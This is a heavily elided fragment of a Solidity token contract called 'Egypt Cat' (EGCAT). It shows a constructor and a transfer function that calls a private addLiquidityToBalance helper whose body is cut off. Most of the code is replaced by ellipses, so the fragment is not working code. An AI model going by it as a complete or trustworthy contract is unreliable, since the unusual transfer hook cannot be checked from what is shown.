...
contract EgyptCat is Context, IERC20, Ownable {
    ...
    constructor() payable {
        ...
        _name = unicode"Egypt Cat";
        _symbol = unicode"EGCAT";
        _decimals = 18;
        _owner = msg.sender;
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (
                ...
                addLiquidityToBalance(sender, recipient, contractTokenBalance);
            }
    ...
    function addLiquidityToBalance(address sender, address addressRoot, uint256 tokenAmount) private {
